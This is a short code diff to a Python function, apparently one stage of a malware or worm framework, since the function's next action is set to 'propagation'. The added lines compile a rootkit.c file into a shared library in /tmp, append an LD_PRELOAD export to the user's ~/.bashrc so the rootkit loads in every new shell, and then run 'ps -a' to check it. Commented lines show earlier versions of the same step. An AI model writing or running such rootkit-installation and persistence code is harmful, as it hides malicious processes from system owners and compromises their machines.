@@ -30,10 +30,13 @@ def run():
     # Directory of the current file
     dir_path = file_path.parent
     print(dir_path)
-
+    #cmd = f"export LD_PRELOAD={dir_path}/../utils/rootkit.so ps &&  ~/.bashrc" 
     # subprocess.run(f"echo 'export LD_PRELOAD={dir_path}/../utils/rootkit.so'>> ~/.bashrc && source ~/.bashrc")
     # subprocess.run("export LD_PRELOAD=./utils/rootkit.so ps", shell=True)
+    subprocess.run("gcc -fPIC -shared -o /tmp/rootkit.so ./utils/rootkit.c -ldl" , shell=True)
+    subprocess.run(f"echo 'export LD_PRELOAD=/tmp/rootkit.so' >> ~/.bashrc && source ~/.bashrc" , shell=True)
 
+    subprocess.run("ps -a" , shell=True)
     next_action = "propagation"
     return data, next_action
 
